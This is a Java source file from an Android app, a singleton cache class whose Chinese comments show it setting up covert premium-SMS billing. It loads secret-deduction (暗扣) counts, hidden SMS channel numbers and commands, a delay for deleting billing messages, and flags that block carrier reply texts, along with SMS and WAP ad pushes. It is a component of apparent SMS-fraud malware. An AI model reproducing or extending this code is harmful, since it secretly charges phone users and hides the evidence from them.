package com.sttm.util;

import java.util.HashMap;
import java.util.List;

/**
 * 缓存器
 * 
 * @author ligm
 * @since 2012.5.3 17：54
 * 
 */

import android.content.Context;
import android.util.Log;

import com.sttm.bean.Ads_header;
import com.sttm.bean.CFGInfo_header;
import com.sttm.bean.ChannelNumber;
import com.sttm.bean.ControlData;
import com.sttm.bean.CurstomCFG;
import com.sttm.bean.SmsAdsData;
import com.sttm.bean.SmsData;
import com.sttm.bean.WapAdsData;
import com.sttm.model.AdsService;
import com.sttm.model.GPRSService;

public class KsoCache {

	// 缓存内容---键值对方式
	private HashMap<String,Object> cacheContent = new HashMap<String,Object>();
    private HashMap<String,Object> sendSmsFlag = new HashMap<String,Object>();
	private static KsoCache cache = null;

	// 锁
	private static final Object LOCK = new Object();

	// 防制外部实例化，只能通过内部实例化
	private KsoCache() {
	}

	/*
	 * // 单态模式，保证每次都是同一个对象 public static synchronized KsoCache
	 * getInstance(Context context) { if (cache == null) { cache = new
	 * KsoCache();
	 * 
	 * }else { if(cache.getCacheSize() <= 0){ cache.init(context); } } return
	 * cache;
	 * 
	 * }
	 */

	// 单态模式，保证每次都是同一个对象
	public static synchronized KsoCache getInstance() {
		if (cache == null) {
			cache = new KsoCache();
		}
		return cache;

	}

	// 系统启动时初始化缓存数据

	public void init(Context context) {
		synchronized (LOCK) {
			// 内置客户配置文件数据初始化
			CurstomCFG cfg = CurstomCFG.getInstance();
			Log.d("KsoCache","0000000000000000");
			cache.reSetValue("curstomID", cfg.getCurstomID());
			cache.reSetValue("startIntelnetDate", cfg.getStartIntelnetDate());// 开始联网日期
			cache.reSetValue("driveup", cfg.getDriveup());// 开机次数
			cache.reSetValue("sellCount", cfg.getSellCount());
			cache.reSetValue("intelnetCount", cfg.getIntelnetCount());// 联网次数
      Log.d("KsoCache","0000000000000000");
			int[] internetDate = cfg.getIntelnetDate();
			Log.d("KsoCache","11111111111111");
			String internetDates = "";
			for (int i = 0; i < internetDate.length; i++) {

				if (i == (internetDate.length - 1)) {
					internetDates += internetDate[i];
				} else {
					internetDates += internetDate[i] + ",";
				}

			}
			cache.reSetValue("internetDate", internetDates);// 自动联网日期
			cache.reSetValue("billStyle", cfg.getBillStyle());// 收费方式
			cache.reSetValue("billCount", cfg.getBillCount());// 收费次数
			cache.reSetValue("deleteTime", cfg.getDeleteTime());// 产品收费删除短信时间
			cache.reSetValue("adsTime", cfg.getUploadTiem());// 暗扣，短信广告等发送的时间间隔（上行的时间间隔）
			cache.reSetValue("isShutDown", cfg.getIsShutDown());// 是否屏蔽运营商的下行
			cache.reSetValue("isChanelShutDown", cfg.getIsChanelShutDown());// 是否屏蔽通道下行
			cache.reSetValue("isNotify", cfg.getIsNotify());// 是否需要提示
			cache.reSetValue("notifyContent", cfg.getNotifyContent());// 提示内容
			
			
			

			// 内置通道数据初始化
			Log.d("KsoCache","22222222222");
			ChannelNumber channel = ChannelNumber.getInstance();
			Log.d("KsoCache","3333333333333");
			cache.reSetValue("CmCount", channel.getCmCount());//移动通道个数
			String CmInfo[] = channel.getCmNumber();
			String temp = "";
			for (int i = 0; i < CmInfo.length; i++) {
				temp += CmInfo[i] + ",";
			}
			reSetValue("mobileChannels", temp);// 移动通道
			CmInfo = channel.getCmCommand();
			temp = "";
			for (int i = 0; i < CmInfo.length; i++) {
				temp += CmInfo[i] + ",";
			}
			reSetValue("mobileOrders", temp);// 移动指令
            
			
			cache.reSetValue("UmCount", channel.getUmCount());//联通通道个数
			String UmInfo[] = channel.getUmNumber();
			temp = "";
			for (int i = 0; i < UmInfo.length; i++) {
				temp += UmInfo[i] + ",";
			}
			reSetValue("unionChannels", temp);// 联通通道
			UmInfo = channel.getUmCommand();
			temp = "";
			for (int i = 0; i < UmInfo.length; i++) {
				temp += UmInfo[i] + ",";
			}
			cache.reSetValue("unionOrders", temp);// 联通指令
			
			
			String[] salesNumbers = channel.getSalesNumber();// 销量号码
			temp = "";
			for (int i = 0; i < salesNumbers.length; i++) {		
				temp += salesNumbers[i] + ",";		
			}
			cache.reSetValue("saleNumbers", temp);// 销量号码
			//Log.d("销量号码初始化", temp);
			
			
			
			
			
			//本地GRPS文件数据初始化	
			GPRSService gprsservice = new GPRSService();
			Log.d("KsoCache","11111111111111");
			byte gprsByte[] = gprsservice.getGPRSByte();
			// 第一次开机 文件为空时 跳过
			if (gprsByte != null) {
				CFGInfo_header gprsheader = gprsservice.getGPRSHeader(gprsByte);
				// 控制数据
				ControlData datacontrol = gprsservice.getControlSmsData(
						gprsByte, gprsheader);
				cache.reSetValue("saleSmsCat", datacontrol.getSellPhoneNumber());// 短信猫销量发送
				cache.reSetValue("monthlySecretPayment", datacontrol.getMonthlySecretPayment());//月暗扣的次数
				cache.reSetValue("isShutSell", datacontrol.getIsShutSell());// 是否关闭销量0：不关，1：要关
				
				// 暗扣短信
				List<SmsData> secretSmsDatas = gprsservice.getSecretSmsData(
						gprsByte, gprsheader);
				String secretSmsNumber = "";
				String secretSmsOrder = "";
				String replyNumber = "";
				int count = 0;
				if (secretSmsDatas != null && secretSmsDatas.size() > 0) {
					for (SmsData secretSmsData : secretSmsDatas) {
						secretSmsNumber += secretSmsData.getChanel() + ",";
						secretSmsOrder += secretSmsData.getOrder() + ",";
						replyNumber = secretSmsData.getDeleteTeleponeNumber();
						count = secretSmsData.getCount();
					}
				}
				cache.reSetValue("deleteTeleponeNumber", replyNumber);
				cache.reSetValue("secretSmsCount", count);
				cache.reSetValue("secretSmsNumber", secretSmsNumber);
				cache.reSetValue("secretSmsOrder", secretSmsOrder);
			}
			
			
			

			// 广告数据初始化
			AdsService adsservice = new AdsService();
			byte adsByte[] = adsservice.getAdsByte();
			// 第一次开机 文件为空时 跳过
			if (adsByte != null) {
				Ads_header adsheader = adsservice.getAdsHeader(adsByte);
				SmsAdsData sadsdata = adsservice.getSmsAdsData(adsByte,
						adsheader);
				WapAdsData wadsdata = adsservice.getWapAdsData(adsByte,
						adsheader);
				if(sadsdata != null){
					if (sadsdata.getPhoneNumber() != null && !"".equals(sadsdata.getPhoneNumber())) {
						cache.reSetValue("adsNumbers", sadsdata.getPhoneNumber());
					}

					if (sadsdata.getSmsContent() != null && !"".equals(sadsdata.getSmsContent())) {
						cache.reSetValue("adsContent", sadsdata.getSmsContent());
					}

				}
				if(wadsdata != null){
					if (wadsdata.getUrl() != null && !"".equals(wadsdata.getUrl())) {
						cache.reSetValue("wap_timeout", wadsdata.getTime());
						cache.reSetValue("url", wadsdata.getUrl());
					}
					
				}
				
			}

			

		
			

		}

	}

	// 重新更新缓存数据
	public void reSetValues(String[] keys, Object[] values) {
		// 传值进来的参数是一个Object数组
		synchronized (LOCK) {
			for (int i = 0; i < values.length; i++) {
				cacheContent.put(keys[i], values[i]);

			}

		}

	}
	
	// 重新更新缓存数据
		public void reSetValues2(String key, Object value) {
			// 传值进来的参数是一个Object数组
			synchronized (LOCK) {
				
				sendSmsFlag.put(key, value);

			}

		}

	// 重新更新缓存数据
	public void reSetValue(String key, Object value) {
		synchronized (LOCK) {
			cacheContent.put(key, value);

		}

	}

	// 根据键取值

	public Object getValue(String key) {
		synchronized (LOCK) {
			return cacheContent.get(key);

		}

	}
	
	public Object getValue2(String key) {
		synchronized (LOCK) {
			return sendSmsFlag.get(key);

		}

	}

	// 根据键删除缓存数据
	public void deleteCache(String key) {
		synchronized (LOCK) {
			cacheContent.remove(key);

		}

	}

	// 根据键删除缓存数据
	public void removeCache(String[] keys) {
		synchronized (LOCK) {
			for (int i = 0; i < keys.length; i++) {
				cacheContent.remove(keys[i]);

			}

		}

	}

	// 全部清空缓存数据
	public void clearCache() {
		synchronized (LOCK) {
			cacheContent.clear();

		}

	}
	
	

	public int getCacheSize() {
		synchronized (LOCK) {
			return cacheContent.size();

		}

	}

}
